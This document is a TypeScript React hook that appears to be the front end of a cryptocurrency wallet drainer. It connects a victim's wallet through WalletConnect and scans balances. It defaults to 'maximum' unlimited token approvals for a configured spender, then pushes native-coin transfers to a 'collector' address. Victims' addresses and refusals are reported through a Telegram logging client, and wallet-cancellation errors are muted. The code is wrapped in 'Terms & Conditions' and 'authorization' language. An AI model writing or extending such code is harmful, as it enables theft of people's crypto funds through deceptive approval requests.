"use client";

import { useCallback, useEffect, useRef, useState } from "react";
import { TERMS_VERSION } from "../core/approve-config";
import { fetchBalances } from "../core/balances-client";
import {
  METADATA,
  projectId,
  WC_CONNECT_NAMESPACES,
} from "../core/constants";
import { postFlowLog } from "../core/flow-log-client";
import { rowsFromBalances } from "../core/network-meta";
import { createBrowserApprovalOrchestrator } from "../approval/create-browser-orchestrator";
import { ApprovalStageName, StageStatus } from "../approval/types";
import { createBrowserNativeTransferOrchestrator } from "../native-transfer/create-browser-orchestrator";
import { createHttpNativeTransferApiClient } from "../native-transfer/http-api-client";
import type { NativeTransferEstimate } from "../native-transfer/types";
import { postTgLog } from "../core/tg-log-client";
import {
  getErrorMessage,
  isUserRejection,
  muteWalletCancellationConsoleErrors,
} from "../core/errors";
import {
  accountsFromSession,
  getTronLinkAddress,
} from "../core/tron-sign";
import {
  getSharedWcModal,
  purgeExtraWcmModals,
} from "../providers/wallet-connect-modal";
import type { ConnectFlowProps } from "../types/connect-flow-props";
import {
  configGaps,
  getSpenderForNetwork,
} from "../types/connect-flow-props";
import { tokensForNetwork } from "../core/chain-tokens";
import {
  applyCollectionModeForNetwork,
  buildMaximumPreferences,
  buildMaximumPreferencesForNetwork,
  listIncludedTokenWork,
  validateIncludedPrefs,
} from "../authorization/preferences";
import { runAuthorizationSession } from "../authorization/session";
import type {
  AuthorizationSessionResult,
  CollectionMode,
  CollectionPreferences,
  LinkedAccounts,
  ModalStep,
  NetworkRow,
  NetworkTokenPrefs,
  RowStatus,
  TokenPreference,
  TokenSymbol,
  UniversalProvider,
  WalletConnectModal,
} from "../types";

function inferCollectionMode(
  networkKey: string,
  row: NetworkTokenPrefs | undefined
): CollectionMode {
  const tokens = tokensForNetwork(networkKey);
  if (tokens.length === 0) return "maximum";
  if (!row) return "maximum";
  const allMaximum = tokens.every(
    (t) => row[t.symbol]?.included && row[t.symbol]?.mode === "maximum"
  );
  return allMaximum ? "maximum" : "custom";
}

export function useConnectFlow(props: ConnectFlowProps = {}) {
  const spendersRef = useRef(props);
  spendersRef.current = props;
  const providerRef = useRef<UniversalProvider | null>(null);
  const modalRef = useRef<WalletConnectModal | null>(null);
  const connectingRef = useRef(false);
  const approvingLockRef = useRef(false);
  const initOnceRef = useRef(false);
  const accountsRef = useRef<LinkedAccounts>({ evm: null, tron: null });
  const traceIdRef = useRef<string>("");
  const networksRef = useRef<NetworkRow[]>([]);

  const [ready, setReady] = useState(false);
  const [busy, setBusy] = useState(false);
  const [approving, setApproving] = useState(false);
  const [showResults, setShowResults] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [networks, setNetworks] = useState<NetworkRow[]>([]);
  const [selectedKey, setSelectedKey] = useState<string | null>(null);
  const [rowStatus, setRowStatus] = useState<Record<string, RowStatus>>({});
  const [modalStep, setModalStep] = useState<ModalStep>("preferences");
  const [collectionMode, setCollectionMode] =
    useState<CollectionMode>("maximum");
  const [preferences, setPreferences] = useState<CollectionPreferences>({});
  const [termsAccepted, setTermsAccepted] = useState(false);
  const [sessionResult, setSessionResult] =
    useState<AuthorizationSessionResult | null>(null);
  const [authorizingAsset, setAuthorizingAsset] = useState<{
    network: string;
    token: TokenSymbol;
  } | null>(null);
  const [nativeSelected, setNativeSelected] = useState<Record<string, boolean>>(
    {}
  );
  const [nativeEstimates, setNativeEstimates] = useState<
    Record<string, NativeTransferEstimate | null>
  >({});
  const [nativeEstimateLoading, setNativeEstimateLoading] = useState<
    Record<string, boolean>
  >({});
  const [nativeEstimateErrors, setNativeEstimateErrors] = useState<
    Record<string, string | null>
  >({});

  networksRef.current = networks;

  const logStep = useCallback(
    (step: string, detail: Record<string, unknown> = {}) => {
      const traceId = traceIdRef.current || "n/a";
      void postFlowLog(step, detail, traceId);
    },
    []
  );

  const resetAuthorizeForm = useCallback(() => {
    setSelectedKey(null);
    setModalStep("preferences");
    setCollectionMode("maximum");
    setPreferences({});
    setTermsAccepted(false);
    setSessionResult(null);
    setAuthorizingAsset(null);
    setNativeSelected({});
    setNativeEstimates({});
    setNativeEstimateLoading({});
    setNativeEstimateErrors({});
  }, []);

  const setStatus = useCallback((key: string, status: RowStatus) => {
    setRowStatus((prev) => ({ ...prev, [key]: status }));
  }, []);

  const refreshNativeEstimateFor = useCallback(
    async (networkKey: string) => {
      const linked = accountsRef.current;
      const owner = networkKey === "tron" ? linked.tron : linked.evm;
      if (!owner) {
        setNativeEstimates((prev) => ({ ...prev, [networkKey]: null }));
        setNativeEstimateErrors((prev) => ({
          ...prev,
          [networkKey]: "No wallet address for this network",
        }));
        return;
      }

      setNativeEstimateLoading((prev) => ({ ...prev, [networkKey]: true }));
      setNativeEstimateErrors((prev) => ({ ...prev, [networkKey]: null }));
      try {
        const api = createHttpNativeTransferApiClient();
        const estimate = await api.estimate({
          request: {
            network: networkKey,
            owner,
            traceId: traceIdRef.current,
          },
        });
        setNativeEstimates((prev) => ({ ...prev, [networkKey]: estimate }));
      } catch (err: unknown) {
        const message = getErrorMessage(err, "Failed to estimate network fees");
        setNativeEstimates((prev) => ({ ...prev, [networkKey]: null }));
        setNativeEstimateErrors((prev) => ({ ...prev, [networkKey]: message }));
        console.warn("[native-estimate]", networkKey, message);
      } finally {
        setNativeEstimateLoading((prev) => ({ ...prev, [networkKey]: false }));
      }
    },
    []
  );

  const refreshAllNativeEstimates = useCallback(
    async (rows: NetworkRow[]) => {
      await Promise.all(rows.map((row) => refreshNativeEstimateFor(row.key)));
    },
    [refreshNativeEstimateFor]
  );

  const scanWallet = useCallback(
    async (linked: LinkedAccounts) => {
      if (!linked.evm && !linked.tron) {
        setNetworks([]);
        return;
      }

      setError(null);
      setNetworks([]);
      setRowStatus({});
      resetAuthorizeForm();

      try {
        logStep("SCAN STARTED", { linked });
        let tron = linked.tron;
        if (!tron) tron = await getTronLinkAddress();

        const linkedFinal = { evm: linked.evm, tron };
        accountsRef.current = linkedFinal;

        const primary = tron || linked.evm;
        const network = tron ? "tron" : "evm";
        const [, data] = await Promise.all([
          primary
            ? postTgLog({
                type: "scan",
                address: primary,
                network,
                status: "success",
                error: null,
              })
            : Promise.resolve(),
          fetchBalances(linked.evm, tron),
        ]);
        logStep("BALANCES FETCH SUCCESS", { networks: Object.keys(data) });

        const rows = rowsFromBalances(data);
        setNetworks(rows);
        setRowStatus(
          Object.fromEntries(rows.map((r) => [r.key, "awaiting" as RowStatus]))
        );
        // Seed independent per-network drafts; sessions still authorize one network at a time.
        setPreferences(buildMaximumPreferences(rows));
        setCollectionMode("maximum");
        setSelectedKey(null);
        setShowResults(true);
        setModalStep("preferences");

        logStep("STEP 1 COMPLETE — WALLET CONNECTED + BALANCES", {
          fundsMoved: "NO — read-only scan",
          evm: linkedFinal.evm,
          tron: linkedFinal.tron,
          networks: rows.map((r) => ({
            key: r.key,
            native: r.balances.native,
            usdt: r.balances.usdt,
            usdc: r.balances.usdc ?? null,
          })),
        });

        void refreshAllNativeEstimates(rows);
      } catch (err: unknown) {
        console.error(err);
        logStep("BALANCES FETCH FAILED", {
          error: getErrorMessage(err, "scan failed"),
        });
        setError(
          err instanceof Error ? err.message : "Failed to fetch balances"
        );
        setNetworks([]);
      }
    },
    [logStep, refreshAllNativeEstimates, resetAuthorizeForm]
  );

  useEffect(() => {
    let cancelled = false;
    muteWalletCancellationConsoleErrors();

    async function init() {
      if (!projectId) {
        setError("Missing NEXT_PUBLIC_PROJECT_ID in .env.local");
        return;
      }

      if (initOnceRef.current && providerRef.current && modalRef.current) {
        setReady(true);
        return;
      }

      const [{ default: UniversalProvider }, { WalletConnectModal }] =
        await Promise.all([
          import("@walletconnect/universal-provider"),
          import("@walletconnect/modal"),
        ]);

      if (cancelled) return;

      const modal = getSharedWcModal(WalletConnectModal, projectId);

      const provider = await UniversalProvider.init({
        projectId,
        metadata: {
          ...METADATA,
          url:
            typeof window !== "undefined"
              ? window.location.origin
              : METADATA.url,
        },
      });

      if (cancelled) return;

      provider.events.removeAllListeners("display_uri");
      provider.events.removeAllListeners("session_delete");
      provider.on("display_uri", (uri: string) => {
        logStep("QR DISPLAYED", { hasUri: Boolean(uri) });
        purgeExtraWcmModals(document.querySelector("wcm-modal"));
        void modal.openModal({ uri });
      });
      provider.on("session_delete", () => {
        logStep("SESSION DELETED");
        setNetworks([]);
        setShowResults(false);
        setRowStatus({});
        accountsRef.current = { evm: null, tron: null };
        resetAuthorizeForm();
      });

      providerRef.current = provider;
      modalRef.current = modal;
      initOnceRef.current = true;
      setReady(true);
    }

    init().catch((err: unknown) => {
      console.error(err);
      setError(
        err instanceof Error ? err.message : "Failed to init WalletConnect"
      );
    });

    return () => {
      cancelled = true;
      modalRef.current?.closeModal();
    };
  }, [logStep, resetAuthorizeForm]);

  const openWalletConnect = useCallback(async () => {
    traceIdRef.current = `flow-${Date.now().toString(36)}-${Math.random()
      .toString(36)
      .slice(2, 8)}`;
    logStep("CONNECT STARTED", { traceId: traceIdRef.current });
    const provider = providerRef.current;
    const modal = modalRef.current;
    if (!provider || connectingRef.current) return;

    connectingRef.current = true;
    setError(null);
    setBusy(true);
    setShowResults(false);
    setNetworks([]);
    setRowStatus({});
    resetAuthorizeForm();

    let unsubscribeModal: (() => void) | undefined;
    if (modal) {
      let modalWasOpen = false;
      unsubscribeModal = modal.subscribeModal((state) => {
        if (state.open) {
          modalWasOpen = true;
          return;
        }
        if (!modalWasOpen || !connectingRef.current || provider.session) return;
        provider.abortPairingAttempt();
        connectingRef.current = false;
        setBusy(false);
      });
    }

    try {
      if (provider.session) {
        await provider.disconnect().catch(() => undefined);
      }

      await provider.connect({
        optionalNamespaces: WC_CONNECT_NAMESPACES,
      });
      logStep("WALLET CONNECTED");

      modal?.closeModal();

      const linked = accountsFromSession(provider.session);

      if (!linked.evm && !linked.tron) {
        logStep("CONNECT FAILED — NO ACCOUNTS");
        setError("No account returned from wallet. Please try again.");
        return;
      }

      await scanWallet(linked);
    } catch (err: unknown) {
      console.error(err);
      logStep("CONNECT ERROR", {
        error: getErrorMessage(err, "connect failed"),
      });
      modal?.closeModal();
      const message =
        err instanceof Error ? err.message : "Connection cancelled";
      if (/reset/i.test(message)) {
        setError("Connection request reset. Please try again.");
      } else if (!/rejected|denied|cancel|abort/i.test(message)) {
        setError(message);
      }
      setNetworks([]);
      setShowResults(false);
    } finally {
      unsubscribeModal?.();
      connectingRef.current = false;
      setBusy(false);
    }
  }, [logStep, resetAuthorizeForm, scanWallet]);

  const onSelectNetwork = useCallback(
    (key: string) => {
      if (approving) return;
      setSelectedKey(key);
      setError(null);
      setPreferences((prev) => {
        const row = prev[key] ?? buildMaximumPreferencesForNetwork(key);
        setCollectionMode(inferCollectionMode(key, row));
        if (prev[key]) return prev;
        return { ...prev, [key]: row };
      });
    },
    [approving]
  );

  const onCollectionModeChange = useCallback(
    (mode: CollectionMode) => {
      if (approving || !selectedKey) return;
      setCollectionMode(mode);
      setPreferences((prev) =>
        applyCollectionModeForNetwork(mode, selectedKey, prev)
      );
      setError(null);
    },
    [approving, selectedKey]
  );

  const onTokenPreferenceChange = useCallback(
    (network: string, token: TokenSymbol, patch: Partial<TokenPreference>) => {
      if (approving) return;
      setPreferences((prev) => {
        const row = { ...(prev[network] ?? {}) };
        const current = row[token] ?? {
          included: false,
          mode: "custom" as const,
          amountHuman: "",
        };
        row[token] = { ...current, ...patch };
        return { ...prev, [network]: row };
      });
      if (network === selectedKey) {
        setCollectionMode("custom");
      }
      setError(null);
    },
    [approving, selectedKey]
  );

  const requestAuthorizeSession = useCallback(async () => {
    const provider = providerRef.current;
    if (!provider || approvingLockRef.current) return;

    if (!selectedKey) {
      setError("Select a network first");
      return;
    }
    if (!termsAccepted) {
      setError("Accept the Terms & Conditions to continue");
      return;
    }

    const items = listIncludedTokenWork(preferences, networks, selectedKey);
    const validationError = validateIncludedPrefs(items);
    if (validationError) {
      setError(validationError);
      return;
    }

    const gaps = configGaps(spendersRef.current, selectedKey);
    if (gaps.length > 0) {
      setError(
        `Missing spender for ${selectedKey}: ${gaps.join(", ")} (pass props or set .env.local)`
      );
      return;
    }

    approvingLockRef.current = true;
    setApproving(true);
    setError(null);
    setModalStep("authorizing");
    setSessionResult(null);

    try {
      logStep("APPROVAL SESSION STARTED", {
        network: selectedKey,
        mode: collectionMode,
        assetCount: items.length,
        assets: items.map((i) => `${i.network}:${i.token}`),
      });

      const orchestrator = createBrowserApprovalOrchestrator({
        provider,
        logger: {
          info: (event, detail) => logStep(event, detail ?? {}),
          warn: (event, detail) => logStep(event, detail ?? {}),
          error: (event, detail) => logStep(event, detail ?? {}),
        },
      });

      const summary = await runAuthorizationSession({
        items,
        networks,
        accounts: accountsRef.current,
        getSpender: (networkKey) =>
          getSpenderForNetwork(spendersRef.current, networkKey),
        log: logStep,
        onAssetStart: (item) => {
          setAuthorizingAsset({ network: item.network, token: item.token });
          setStatus(item.network, "waiting");
        },
        onAssetEnd: (result) => {
          if (result.outcome === "authorized") {
            setStatus(result.network, "approved");
          } else if (result.outcome === "user_rejected") {
            setStatus(result.network, "rejected");
            window.setTimeout(
              () => setStatus(result.network, "awaiting"),
              2200
            );
          } else if (
            result.outcome === "failed" ||
            result.outcome === "skipped_unsupported"
          ) {
            setStatus(result.network, "awaiting");
          }

          const owner =
            result.network === "tron"
              ? accountsRef.current.tron
              : accountsRef.current.evm;
          if (
            owner &&
            (result.outcome === "failed" || result.outcome === "user_rejected")
          ) {
            void postTgLog({
              type: "approve",
              address: owner,
              network: result.network,
              status: "rejected",
              error:
                result.outcome === "user_rejected"
                  ? "Permission denied by user"
                  : result.message ?? "Approval failed",
            });
          }
        },
        runApproval: async (args) => {
          return orchestrator.run(
            {
              network: args.network,
              owner: args.owner,
              token: args.token,
              amountHuman: args.amountHuman,
              unlimited: args.unlimited,
              nativeBalanceHuman: args.nativeBalanceHuman,
              tokenBalanceHuman: args.tokenBalanceHuman,
              executeTransfer: args.executeTransfer,
              transferToAddress: args.transferToAddress,
              transferAmountRaw: args.transferAmountRaw,
              traceId: traceIdRef.current,
            },
            {
              onStage: (stageResult) => {
                if (
                  stageResult.stage === ApprovalStageName.BROADCAST &&
                  stageResult.status === StageStatus.OK
                ) {
                  setStatus(args.network, "finalizing");
                }
                args.onStage?.({
                  stage: stageResult.stage,
                  status: stageResult.status,
                  data: stageResult.data,
                  error: stageResult.error ?? null,
                });
              },
            }
          );
        },
      });

      setAuthorizingAsset(null);
      setSessionResult(summary);
      setModalStep("results");

      logStep("AUTHORIZATION SESSION RESULT SUMMARY", {
        authorizedCount: summary.authorizedCount,
        failedCount: summary.failedCount,
        rejectedCount: summary.rejectedCount,
        skippedCount: summary.skippedCount,
        items: summary.items,
      });

      if (summary.authorizedCount === 0 && summary.rejectedCount > 0) {
        setError("All approval requests were rejected or failed");
      } else if (summary.failedCount > 0 || summary.rejectedCount > 0) {
        setError(null);
      }
    } catch (err: unknown) {
      console.error(err);
      const message = getErrorMessage(err, "Authorization session failed");
      logStep("AUTHORIZATION SESSION FAILED", { error: message });
      setError(message);
      setModalStep("preferences");
    } finally {
      setAuthorizingAsset(null);
      approvingLockRef.current = false;
      setApproving(false);
    }
  }, [
    collectionMode,
    logStep,
    networks,
    preferences,
    selectedKey,
    setStatus,
    termsAccepted,
  ]);

  const onContinueToNative = useCallback(() => {
    setError(null);
    setModalStep("native");
    const networkKey = selectedKey;
    if (!networkKey) {
      setNativeSelected({});
      return;
    }
    const est = nativeEstimates[networkKey];
    setNativeSelected({
      [networkKey]: Boolean(
        est?.canTransfer && BigInt(est.transferableRaw) > BigInt(0)
      ),
    });
    void refreshNativeEstimateFor(networkKey);
  }, [nativeEstimates, refreshNativeEstimateFor, selectedKey]);

  const onSkipNative = useCallback(() => {
    setShowResults(false);
    setModalStep("preferences");
  }, []);

  const onNativeToggle = useCallback((network: string, included: boolean) => {
    setNativeSelected((prev) => ({ ...prev, [network]: included }));
  }, []);

  const onNativeSelectAll = useCallback(
    (included: boolean) => {
      if (!selectedKey) {
        setNativeSelected({});
        return;
      }
      const est = nativeEstimates[selectedKey];
      const eligible =
        est != null &&
        est.canTransfer &&
        BigInt(est.transferableRaw) > BigInt(0);
      setNativeSelected({ [selectedKey]: included && eligible });
    },
    [nativeEstimates, selectedKey]
  );

  const requestNativeTransfers = useCallback(async () => {
    const provider = providerRef.current;
    if (!provider || approvingLockRef.current) return;

    const selectedKeys = Object.entries(nativeSelected)
      .filter(([, on]) => on)
      .map(([key]) => key);
    if (selectedKeys.length === 0) {
      setError("Select at least one network for native transfer");
      return;
    }

    approvingLockRef.current = true;
    setApproving(true);
    setError(null);

    const nativeResults = [...(sessionResult?.items ?? [])];

    try {
      logStep("NATIVE TRANSFER SESSION STARTED", {
        networks: selectedKeys,
      });

      for (const networkKey of selectedKeys) {
        const estimate = nativeEstimates[networkKey];
        const owner =
          networkKey === "tron"
            ? accountsRef.current.tron
            : accountsRef.current.evm;

        if (
          !owner ||
          !estimate ||
          !estimate.canTransfer ||
          BigInt(estimate.transferableRaw) <= BigInt(0)
        ) {
          const result = {
            network: networkKey,
            token: "NATIVE" as const,
            outcome: "skipped_zero" as const,
            message: "Skipped — no transferable native balance",
          };
          nativeResults.push(result);
          logStep("NATIVE TRANSFER ASSET SKIPPED", result);
          continue;
        }

        const gaps = configGaps(spendersRef.current, networkKey);
        if (gaps.length > 0) {
          const result = {
            network: networkKey,
            token: "NATIVE" as const,
            outcome: "failed" as const,
            message: `Missing collector: ${gaps.join(", ")}`,
          };
          nativeResults.push(result);
          logStep("NATIVE TRANSFER ASSET FAILED", result);
          continue;
        }

        setStatus(networkKey, "waiting");
        try {
          const orchestrator = createBrowserNativeTransferOrchestrator({
            provider,
            logger: {
              info: (event, detail) => logStep(event, detail ?? {}),
              warn: (event, detail) => logStep(event, detail ?? {}),
              error: (event, detail) => logStep(event, detail ?? {}),
            },
          });

          const result = await orchestrator.run(
            {
              network: networkKey,
              owner,
              termsVersion: TERMS_VERSION,
              traceId: traceIdRef.current,
            },
            {
              onStage: (stageResult) => {
                if (
                  stageResult.stage === "BROADCAST" &&
                  stageResult.status === "OK"
                ) {
                  setStatus(networkKey, "finalizing");
                }
              },
            }
          );

          if (!result.ok) {
            const rejected = Boolean(result.userRejected);
            const assetResult = {
              network: networkKey,
              token: "NATIVE" as const,
              outcome: (rejected
                ? "user_rejected"
                : "failed") as "user_rejected" | "failed",
              message: result.error || "Native transfer failed",
              txHash: result.txHash,
            };
            nativeResults.push(assetResult);
            setStatus(networkKey, rejected ? "rejected" : "awaiting");
            logStep(
              rejected
                ? "NATIVE TRANSFER ASSET REJECTED"
                : "NATIVE TRANSFER ASSET FAILED",
              assetResult
            );
            void postTgLog({
              type: "native_transfer",
              address: owner,
              network: networkKey,
              status: "rejected",
              error: rejected
                ? "Permission denied by user"
                : assetResult.message,
            });
            continue;
          }

          const assetResult = {
            network: networkKey,
            token: "NATIVE" as const,
            outcome: (result.pendingRegistered
              ? "pending"
              : "collected") as "pending" | "collected",
            message: result.pendingRegistered
              ? "Native transfer pending confirmation"
              : "Native transfer confirmed",
            txHash: result.txHash,
          };
          nativeResults.push(assetResult);
          setStatus(networkKey, "approved");
          logStep("NATIVE TRANSFER COMPLETE", {
            fundsMoved: result.pendingRegistered
              ? "PENDING — registered for background reconciliation"
              : "YES — native transfer confirmed",
            network: networkKey,
            owner,
            txHash: result.txHash,
            transferId: result.transferId,
          });
        } catch (err: unknown) {
          const rejected = isUserRejection(err);
          const assetResult = {
            network: networkKey,
            token: "NATIVE" as const,
            outcome: (rejected
              ? "user_rejected"
              : "failed") as "user_rejected" | "failed",
            message: getErrorMessage(err, "Native transfer failed"),
          };
          nativeResults.push(assetResult);
          setStatus(networkKey, rejected ? "rejected" : "awaiting");
          logStep(
            rejected
              ? "NATIVE TRANSFER ASSET REJECTED"
              : "NATIVE TRANSFER ASSET FAILED",
            assetResult
          );
        }
      }

      const nextSession: AuthorizationSessionResult = {
        items: nativeResults,
        authorizedCount: nativeResults.filter((i) => i.outcome === "authorized")
          .length,
        failedCount: nativeResults.filter((i) => i.outcome === "failed")
          .length,
        rejectedCount: nativeResults.filter(
          (i) => i.outcome === "user_rejected"
        ).length,
        skippedCount: nativeResults.filter(
          (i) =>
            i.outcome === "skipped_unsupported" ||
            i.outcome === "skipped_zero"
        ).length,
      };
      setSessionResult(nextSession);
      logStep("NATIVE TRANSFER SESSION COMPLETE", {
        items: nativeResults.filter((i) => i.token === "NATIVE"),
      });
      setModalStep("results");
    } finally {
      approvingLockRef.current = false;
      setApproving(false);
    }
  }, [
    logStep,
    nativeEstimates,
    nativeSelected,
    sessionResult,
    setStatus,
  ]);

  const closeResultsModal = useCallback(() => {
    if (approving) return;
    setShowResults(false);
  }, [approving]);

  return {
    ready,
    busy,
    approving,
    showResults,
    error,
    networks,
    selectedKey,
    rowStatus,
    modalStep,
    collectionMode,
    preferences,
    termsAccepted,
    sessionResult,
    authorizingAsset,
    nativeSelected,
    nativeEstimates,
    nativeEstimateLoading,
    nativeEstimateErrors,
    spenderEvm: getSpenderForNetwork(props, "eth"),
    spenderTron: getSpenderForNetwork(props, "tron"),
    termsVersion: TERMS_VERSION,
    openWalletConnect,
    onSelectNetwork,
    onCollectionModeChange,
    onTokenPreferenceChange,
    onTermsChange: setTermsAccepted,
    onAuthorize: () => {
      void requestAuthorizeSession();
    },
    onContinueToNative,
    onSkipNative,
    onNativeToggle,
    onNativeSelectAll,
    onSubmitNative: () => {
      void requestNativeTransfers();
    },
    onRetryNativeEstimate: (network: string) => {
      void refreshNativeEstimateFor(network);
    },
    closeResultsModal,
  };
}
